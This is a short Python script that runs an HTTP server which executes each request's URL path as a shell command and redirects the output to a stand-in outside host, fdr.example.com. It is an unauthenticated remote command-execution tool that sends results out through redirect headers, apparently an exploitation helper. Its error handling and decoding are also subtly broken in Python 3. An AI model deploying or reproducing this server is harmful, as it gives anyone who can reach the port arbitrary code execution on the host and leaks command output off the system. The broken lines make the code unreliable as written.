#!/usr/bin/python3
import os, urllib.parse, sys
from http.server import HTTPServer, BaseHTTPRequestHandler

class Redirect(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        try:
            out = os.popen(urllib.parse.unquote(self.path[1:])).read().decode()
        except:
            out = 'EXCEPTION/'+sys.exc_info()[0]
        self.send_header('Location', 'http://fdr.example.com/out/' + urllib.parse.quote(out))
        self.end_headers()


HTTPServer(("", 9980), Redirect).serve_forever()
